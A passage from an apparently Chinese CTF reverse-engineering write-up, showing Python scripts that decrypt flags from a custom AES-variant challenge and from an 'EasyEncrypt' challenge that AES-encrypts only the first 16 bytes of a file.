class="number">1</span>][<span class="number">2</span>] = state[<span class="number">3</span>][<span class="number">2</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">2</span>] = tmp</span><br><span class="line"></span><br><span class="line">    tmp = state[<span class="number">0</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">0</span>][<span class="number">3</span>] = state[<span class="number">1</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">1</span>][<span class="number">3</span>] = state[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">2</span>][<span class="number">3</span>] = state[<span class="number">3</span>][<span class="number">3</span>]</span><br><span class="line">    state[<span class="number">3</span>][<span class="number">3</span>] = tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">state</span>):</span><br><span class="line">    matrix_a = [[<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">                [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">                [<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]]</span><br><span class="line">    res = [[<span class="literal">None</span> <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp_sum ^= polynomial_multiply(matrix_a[i][k], state[j][k])</span><br><span class="line">                tmp_sum = polynomial_divide(tmp_sum, <span class="number">0x11B</span>)[<span class="number">1</span>]</span><br><span class="line">            res[j][i] = tmp_sum</span><br><span class="line">    state[:] = res[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">state</span>):</span><br><span class="line">    matrix_a = [[<span class="number">14</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>],</span><br><span class="line">                [<span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">13</span>],</span><br><span class="line">                [<span class="number">13</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>],</span><br><span class="line">                [<span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">14</span>]]</span><br><span class="line">    res = [[<span class="literal">None</span> <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp_sum ^= polynomial_multiply(matrix_a[i][k], state[j][k])</span><br><span class="line">                tmp_sum = polynomial_divide(tmp_sum, <span class="number">0x11B</span>)[<span class="number">1</span>]</span><br><span class="line">            res[j][i] = tmp_sum</span><br><span class="line">    state[:] = res[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">show(plain)</span></span><br><span class="line"><span class="string">show(t1)</span></span><br><span class="line"><span class="string">tmp = [plain[i]^t1[i] for i in range(16)]</span></span><br><span class="line"><span class="string">show(tmp)</span></span><br><span class="line"><span class="string">tmp = [tmp[i]^t2[i] for i in range(16)]</span></span><br><span class="line"><span class="string">show(tmp)</span></span><br><span class="line"><span class="string">for i in range(16):</span></span><br><span class="line"><span class="string">    tmp[i] = box1[tmp[i]]</span></span><br><span class="line"><span class="string">show(tmp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shift_rows(tmp)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([<span class="number">0x20</span>, <span class="number">0xB0</span>, <span class="number">0x0E</span>, <span class="number">0xA2</span>, <span class="number">0x0C</span>, <span class="number">0x3A</span>, <span class="number">0x15</span>, <span class="number">0x55</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x5B</span>, <span class="number">0x8E</span>, <span class="number">0x1C</span>, <span class="number">0x2A</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>,<span class="number">0xB4</span>, <span class="number">0x4A</span>, <span class="number">0xC1</span>, <span class="number">0xBC</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x42</span>, <span class="number">0x03</span>, <span class="number">0x71</span>, <span class="number">0xBD</span>, <span class="number">0x25</span>, <span class="number">0x3A</span>, <span class="number">0xB9</span>, <span class="number">0xE9</span>,<span class="number">0xF0</span>, <span class="number">0x89</span>, <span class="number">0x40</span>, <span class="number">0x2D</span>, <span class="number">0x6F</span>, <span class="number">0x94</span>, <span class="number">0x47</span>, <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0xF9</span>, <span class="number">0x0F</span>, <span class="number">0x95</span>, <span class="number">0xAB</span>, <span class="number">0xC8</span>, <span class="number">0xCB</span>, <span class="number">0x14</span>])</span><br><span class="line"></span><br><span class="line">t1 = [[<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x99</span>, <span class="number">0x99</span>], [<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x88</span>], [<span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>], [<span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x77</span>]]</span><br><span class="line">t2 = [[<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x88</span>], [<span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x66</span>, <span class="number">0x66</span>], [<span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x77</span>, <span class="number">0x77</span>], [<span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x99</span>, <span class="number">0x99</span>]]</span><br><span class="line"></span><br><span class="line">box1 = [<span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0x62</span>, <span class="number">0xD8</span>, <span class="number">0xB5</span>, <span class="number">0x84</span>, <span class="number">0xCD</span>, <span class="number">0xF6</span>, <span class="number">0xDC</span>, <span class="number">0x2A</span>, <span class="number">0xE6</span>, <span class="number">0xED</span>, <span class="number">0xAB</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0xAF</span>,<span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x68</span>, <span class="number">0x14</span>, <span class="number">0x27</span>, <span class="number">0xA1</span>, <span class="number">0xDB</span>, <span class="number">0x87</span>, <span class="number">0x9C</span>, <span class="number">0xE7</span>, <span class="number">0x29</span>, <span class="number">0x66</span>, <span class="number">0x35</span>, <span class="number">0xE9</span>, <span class="number">0xB4</span>, <span class="number">0x91</span>,<span class="number">0x8B</span>, <span class="number">0xCE</span>, <span class="number">0xF3</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0x32</span>, <span class="number">0x2D</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0xC4</span>,<span class="number">0xF5</span>, <span class="number">0x2C</span>, <span class="number">0x72</span>, <span class="number">0xA4</span>, <span class="number">0xC9</span>, <span class="number">0x06</span>, <span class="number">0xB9</span>, <span class="number">0x6E</span>, <span class="number">0x19</span>, <span class="number">0x12</span>, <span class="number">0x07</span>, <span class="number">0x22</span>, <span class="number">0xD6</span>, <span class="number">0xD3</span>, <span class="number">0x00</span>, <span class="number">0x71</span>,<span class="number">0x98</span>, <span class="number">0x0E</span>, <span class="number">0x6B</span>, <span class="number">0xCA</span>, <span class="number">0x64</span>, <span class="number">0x3D</span>, <span class="number">0xBA</span>, <span class="number">0xFE</span>, <span class="number">0x88</span>, <span class="number">0x02</span>, <span class="number">0xE3</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0x1F</span>, <span class="number">0x2F</span>, <span class="number">0x8F</span>,<span class="number">0x2E</span>, <span class="number">0x3A</span>, <span class="number">0x31</span>, <span class="number">0x9B</span>, <span class="number">0xF0</span>, <span class="number">0xE2</span>, <span class="number">0x7B</span>, <span class="number">0x99</span>, <span class="number">0xBB</span>, <span class="number">0xA8</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0xD4</span>, <span class="number">0x8D</span>, <span class="number">0xF4</span>, <span class="number">0x69</span>,<span class="number">0xBF</span>, <span class="number">0xE8</span>, <span class="number">0x4B</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0x76</span>, <span class="number">0xB0</span>, <span class="number">0x10</span>, <span class="number">0xB8</span>, <span class="number">0x97</span>, <span class="number">0xC6</span>, <span class="number">0x9F</span>, <span class="number">0x16</span>, <span class="number">0xF7</span>, <span class="number">0xAC</span>, <span class="number">0xDD</span>,<span class="number">0x45</span>, <span class="number">0xBC</span>, <span class="number">0xC5</span>, <span class="number">0xE1</span>, <span class="number">0xAD</span>, <span class="number">0x7C</span>, <span class="number">0x5B</span>, <span class="number">0xFC</span>, <span class="number">0xCC</span>, <span class="number">0xAE</span>, <span class="number">0x59</span>, <span class="number">0x9A</span>, <span class="number">0x6F</span>, <span class="number">0xE5</span>, <span class="number">0x67</span>, <span class="number">0xA3</span>,<span class="number">0x58</span>, <span class="number">0xC7</span>, <span class="number">0x8C</span>, <span class="number">0x65</span>, <span class="number">0x81</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x83</span>, <span class="number">0x40</span>, <span class="number">0x39</span>, <span class="number">0x5D</span>, <span class="number">0x37</span>, <span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x8E</span>, <span class="number">0x4D</span>,<span class="number">0xCF</span>, <span class="number">0x33</span>, <span class="number">0xF8</span>, <span class="number">0xA2</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0xFA</span>, <span class="number">0xD7</span>, <span class="number">0x4A</span>, <span class="number">0xCB</span>, <span class="number">0x82</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x7D</span>,<span class="number">0x08</span>, <span class="number">0xF1</span>, <span class="number">0xBD</span>, <span class="number">0x41</span>, <span class="number">0xB7</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x8A</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0x3E</span>, <span class="number">0x38</span>, <span class="number">0x93</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0xD2</span>,<span class="number">0x96</span>, <span class="number">0x94</span>, <span class="number">0x1A</span>, <span class="number">0xFB</span>, <span class="number">0x5F</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0xEA</span>, <span class="number">0x7F</span>, <span class="number">0x0B</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x26</span>, <span class="number">0x2B</span>,<span class="number">0x1C</span>, <span class="number">0xB3</span>, <span class="number">0x4E</span>, <span class="number">0x85</span>, <span class="number">0x3F</span>, <span class="number">0x5A</span>, <span class="number">0xC0</span>, <span class="number">0x1E</span>, <span class="number">0x50</span>, <span class="number">0x77</span>, <span class="number">0xFF</span>, <span class="number">0x09</span>, <span class="number">0xE4</span>, <span class="number">0x9E</span>, <span class="number">0x25</span>, <span class="number">0x9D</span>,<span class="number">0x05</span>, <span class="number">0x13</span>, <span class="number">0xEE</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0xAA</span>, <span class="number">0x28</span>, <span class="number">0x79</span>, <span class="number">0x86</span>, <span class="number">0x4C</span>, <span class="number">0xF9</span>, <span class="number">0x57</span>, <span class="number">0x6D</span>, <span class="number">0xEB</span>, <span class="number">0x47</span>, <span class="number">0xB2</span>,<span class="number">0xD9</span>, <span class="number">0x18</span>, <span class="number">0xB6</span>, <span class="number">0xBE</span>, <span class="number">0x7A</span>, <span class="number">0xC1</span>, <span class="number">0xA0</span>, <span class="number">0x0D</span>, <span class="number">0x5C</span>, <span class="number">0xC8</span>, <span class="number">0xA5</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x3C</span>, <span class="number">0x20</span>, <span class="number">0xA6</span>,<span class="number">0x03</span>, <span class="number">0x11</span>, <span class="number">0x3B</span>, <span class="number">0x15</span>, <span class="number">0x90</span>, <span class="number">0xFD</span>, <span class="number">0x92</span>, <span class="number">0xEC</span>, <span class="number">0xA9</span>, <span class="number">0x21</span>, <span class="number">0x55</span>, <span class="number">0x1D</span>, <span class="number">0xDF</span>, <span class="number">0x6C</span>, <span class="number">0x42</span>, <span class="number">0xF2</span>]</span><br><span class="line"></span><br><span class="line">box2 = [<span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x49</span>, <span class="number">0xF0</span>, <span class="number">0xA5</span>, <span class="number">0xD0</span>, <span class="number">0x35</span>, <span class="number">0x3A</span>, <span class="number">0xA0</span>, <span class="number">0xCB</span>, <span class="number">0x11</span>, <span class="number">0xBB</span>, <span class="number">0x2E</span>, <span class="number">0xE7</span>, <span class="number">0x41</span>, <span class="number">0xA6</span>,<span class="number">0x67</span>, <span class="number">0xF1</span>, <span class="number">0x39</span>, <span class="number">0xD1</span>, <span class="number">0x13</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x9C</span>, <span class="number">0xE1</span>, <span class="number">0x38</span>, <span class="number">0xB2</span>, <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0xC7</span>, <span class="number">0x4D</span>,<span class="number">0xEE</span>, <span class="number">0xF9</span>, <span class="number">0x3B</span>, <span class="number">0x26</span>, <span class="number">0xB7</span>, <span class="number">0xCE</span>, <span class="number">0xBE</span>, <span class="number">0x14</span>, <span class="number">0xD6</span>, <span class="number">0x1A</span>, <span class="number">0x09</span>, <span class="number">0xBF</span>, <span class="number">0x31</span>, <span class="number">0x2C</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>,<span class="number">0xD4</span>, <span class="number">0x52</span>, <span class="number">0x2B</span>, <span class="number">0x91</span>, <span class="number">0x23</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0xAB</span>, <span class="number">0x89</span>, <span class="number">0x51</span>, <span class="number">0xF2</span>, <span class="number">0xED</span>, <span class="number">0x45</span>, <span class="number">0xAA</span>, <span class="number">0xC4</span>,<span class="number">0x88</span>, <span class="number">0xA3</span>, <span class="number">0xFE</span>, <span class="number">0xBD</span>, <span class="number">0xEB</span>, <span class="number">0x70</span>, <span class="number">0x4B</span>, <span class="number">0xDE</span>, <span class="number">0x5A</span>, <span class="number">0x85</span>, <span class="number">0x98</span>, <span class="number">0x62</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xC2</span>, <span class="number">0x01</span>,<span class="number">0xC8</span>, <span class="number">0xA9</span>, <span class="number">0x0D</span>, <span class="number">0x86</span>, <span class="number">0xB8</span>, <span class="number">0xFA</span>, <span class="number">0x24</span>, <span class="number">0xDB</span>, <span class="number">0x80</span>, <span class="number">0x7A</span>, <span class="number">0xC5</span>, <span class="number">0x76</span>, <span class="number">0xE8</span>, <span class="number">0x8A</span>, <span class="number">0x25</span>, <span class="number">0xB4</span>,<span class="number">0xB6</span>, <span class="number">0x27</span>, <span class="number">0x02</span>, <span class="number">0x5B</span>, <span class="number">0x44</span>, <span class="number">0x83</span>, <span class="number">0x1B</span>, <span class="number">0x7E</span>, <span class="number">0x12</span>, <span class="number">0x5F</span>, <span class="number">0xEC</span>, <span class="number">0x42</span>, <span class="number">0xFD</span>, <span class="number">0xDC</span>, <span class="number">0x37</span>, <span class="number">0x7C</span>,<span class="number">0x28</span>, <span class="number">0x3F</span>, <span class="number">0x32</span>, <span class="number">0x95</span>, <span class="number">0x8D</span>, <span class="number">0x94</span>, <span class="number">0x65</span>, <span class="number">0xC9</span>, <span class="number">0x9B</span>, <span class="number">0xD7</span>, <span class="number">0xE4</span>, <span class="number">0x56</span>, <span class="number">0x75</span>, <span class="number">0x9F</span>, <span class="number">0xB5</span>, <span class="number">0xBA</span>,<span class="number">0x2D</span>, <span class="number">0x84</span>, <span class="number">0x9A</span>, <span class="number">0x87</span>, <span class="number">0x05</span>, <span class="number">0xC3</span>, <span class="number">0xD8</span>, <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0xAE</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x82</span>, <span class="number">0x5D</span>, <span class="number">0x8E</span>, <span class="number">0x4F</span>,<span class="number">0xF4</span>, <span class="number">0x1F</span>, <span class="number">0xF6</span>, <span class="number">0xAC</span>, <span class="number">0xB1</span>, <span class="number">0x9E</span>, <span class="number">0xB0</span>, <span class="number">0x69</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x7B</span>, <span class="number">0x53</span>, <span class="number">0x18</span>, <span class="number">0xCF</span>, <span class="number">0xCD</span>, <span class="number">0x6B</span>,<span class="number">0xE6</span>, <span class="number">0x15</span>, <span class="number">0x93</span>, <span class="number">0x7F</span>, <span class="number">0x33</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0xF8</span>, <span class="number">0xD5</span>, <span class="number">0x0C</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x0F</span>,<span class="number">0x66</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0x04</span>, <span class="number">0xE2</span>, <span class="number">0xA4</span>, <span class="number">0x68</span>, <span class="number">0x36</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x71</span>, <span class="number">0xA2</span>, <span class="number">0xE3</span>, <span class="number">0x60</span>,<span class="number">0xC6</span>, <span class="number">0xE5</span>, <span class="number">0xAD</span>, <span class="number">0x29</span>, <span class="number">0x2F</span>, <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x81</span>, <span class="number">0xE9</span>, <span class="number">0x34</span>, <span class="number">0x43</span>, <span class="number">0x99</span>, <span class="number">0x78</span>, <span class="number">0x06</span>, <span class="number">0x21</span>, <span class="number">0x90</span>,<span class="number">0x10</span>, <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0x3D</span>, <span class="number">0x5C</span>, <span class="number">0xD3</span>, <span class="number">0x3C</span>, <span class="number">0x97</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x08</span>, <span class="number">0x6F</span>, <span class="number">0x63</span>, <span class="number">0xFC</span>,<span class="number">0x9D</span>, <span class="number">0x73</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0xCC</span>, <span class="number">0x7D</span>, <span class="number">0x0A</span>, <span class="number">0x19</span>, <span class="number">0x61</span>, <span class="number">0x1D</span>, <span class="number">0xB9</span>, <span class="number">0xDD</span>, <span class="number">0xF7</span>, <span class="number">0x0B</span>, <span class="number">0xD2</span>, <span class="number">0x4C</span>,<span class="number">0x54</span>, <span class="number">0xA1</span>, <span class="number">0xFF</span>, <span class="number">0x22</span>, <span class="number">0x5E</span>, <span class="number">0x30</span>, <span class="number">0x07</span>, <span class="number">0x6D</span>, <span class="number">0x92</span>, <span class="number">0xDA</span>, <span class="number">0x96</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xF5</span>, <span class="number">0x47</span>, <span class="number">0xCA</span>]</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x65</span>, <span class="number">0x39</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x37</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x35</span>], </span><br><span class="line">[<span class="number">0x25</span>, <span class="number">0x13</span>, <span class="number">0x25</span>, <span class="number">0x13</span>, <span class="number">0x57</span>, <span class="number">0x6F</span>, <span class="number">0x0A</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x07</span>, <span class="number">0x30</span>, <span class="number">0x07</span>, <span class="number">0x8A</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0xBB</span>], </span><br><span class="line">[<span class="number">0x83</span>, <span class="number">0x90</span>, <span class="number">0xB5</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xCE</span>, <span class="number">0xC4</span>, <span class="number">0xF7</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x9E</span>, <span class="number">0x21</span>, <span class="number">0xAF</span>, <span class="number">0x14</span>], </span><br><span class="line">[<span class="number">0x6B</span>, <span class="number">0xFB</span>, <span class="number">0x4E</span>, <span class="number">0xE8</span>, <span class="number">0x4C</span>, <span class="number">0x82</span>, <span class="number">0x46</span>, <span class="number">0xB1</span>, <span class="number">0x1C</span>, <span class="number">0x20</span>, <span class="number">0x2C</span>, <span class="number">0x27</span>, <span class="number">0x91</span>, <span class="number">0xB0</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>], </span><br><span class="line">[<span class="number">0xF7</span>, <span class="number">0x0C</span>, <span class="number">0x42</span>, <span class="number">0xAA</span>, <span class="number">0x2D</span>, <span class="number">0xAF</span>, <span class="number">0xE9</span>, <span class="number">0x58</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFD</span>, <span class="number">0xDA</span>, <span class="number">0xCD</span>, <span class="number">0x7D</span>, <span class="number">0x62</span>, <span class="number">0x69</span>], </span><br><span class="line">[<span class="number">0x5C</span>, <span class="number">0x50</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xD4</span>, <span class="number">0x7B</span>, <span class="number">0x92</span>, <span class="number">0xCA</span>, <span class="number">0x66</span>, <span class="number">0xB7</span>, <span class="number">0x4A</span>, <span class="number">0x90</span>, <span class="number">0xF3</span>, <span class="number">0x8E</span>, <span class="number">0xEC</span>, <span class="number">0x85</span>], </span><br><span class="line">[<span class="number">0x83</span>, <span class="number">0xD3</span>, <span class="number">0xC1</span>, <span class="number">0x79</span>, <span class="number">0x1B</span>, <span class="number">0x60</span>, <span class="number">0xF2</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0xD2</span>, <span class="number">0x42</span>, <span class="number">0xA7</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x40</span>], </span><br><span class="line">[<span class="number">0xDA</span>, <span class="number">0x09</span>, <span class="number">0xC8</span>, <span class="number">0xB1</span>, <span class="number">0x70</span>, <span class="number">0x10</span>, <span class="number">0xE2</span>, <span class="number">0xDA</span>, <span class="number">0xB7</span>, <span class="number">0x2F</span>, <span class="number">0xFD</span>, <span class="number">0xBF</span>, <span class="number">0x09</span>, <span class="number">0x20</span>, <span class="number">0xE5</span>, <span class="number">0xA5</span>], </span><br><span class="line">[<span class="number">0xA3</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0xD3</span>, <span class="number">0x5B</span>, <span class="number">0x4B</span>, <span class="number">0xA9</span>, <span class="number">0x73</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0x61</span>, <span class="number">0xDE</span>, <span class="number">0x9D</span>, <span class="number">0xBD</span>, <span class="number">0x58</span>, <span class="number">0xFD</span>], </span><br><span class="line">[<span class="number">0x59</span>, <span class="number">0xF3</span>, <span class="number">0x91</span>, <span class="number">0x42</span>, <span class="number">0x1C</span>, <span class="number">0x57</span>, <span class="number">0xFE</span>, <span class="number">0x8D</span>, <span class="number">0xDF</span>, <span class="number">0x43</span>, <span class="number">0x22</span>, <span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0xF5</span>, <span class="number">0xAD</span>, <span class="number">0x50</span>], </span><br><span class="line">[<span class="number">0x1B</span>, <span class="number">0xE8</span>, <span class="number">0x79</span>, <span class="number">0x3B</span>, <span class="number">0xC3</span>, <span class="number">0x94</span>, <span class="number">0x6A</span>, <span class="number">0xE7</span>, <span class="number">0xF1</span>, <span class="number">0xB2</span>, <span class="number">0x90</span>, <span class="number">0x6C</span>, <span class="number">0x23</span>, <span class="number">0xD6</span>, <span class="number">0x7B</span>, <span class="number">0x2B</span>]]</span><br><span class="line">childkey = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    ck = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp.append(data[i][k*<span class="number">4</span>+j])</span><br><span class="line">        ck.append(tmp)</span><br><span class="line">    childkey.append(ck)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">16</span>):</span><br><span class="line">    ttt = cipher[_c:_c+<span class="number">16</span>]</span><br><span class="line">    </span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        tttt = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tttt.append(ttt[i*<span class="number">4</span>+j])</span><br><span class="line">        tmp.append(tttt)</span><br><span class="line">    add_round_key(tmp, t2)</span><br><span class="line">    add_round_key(tmp, childkey[<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        inv_shift_rows(tmp)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp[i][j] = box2[tmp[i][j]]</span><br><span class="line">        add_round_key(tmp, childkey[<span class="number">10</span>-_])</span><br><span class="line">        inv_mix_columns(tmp)</span><br><span class="line">    inv_shift_rows(tmp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp[i][j] = box2[tmp[i][j]]</span><br><span class="line">    add_round_key(tmp, childkey[<span class="number">0</span>])</span><br><span class="line">    add_round_key(tmp, t1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="easyencrypt">EasyEncrypt</h3>
<p>去ollvm混淆，aes加密一个文件，只加密了前16个字符，白给</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="string">b&quot;thisisthekey!!!!&quot;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.lck&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    buf = f.read(<span class="number">16</span>)</span><br><span class="line">    buf2 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> 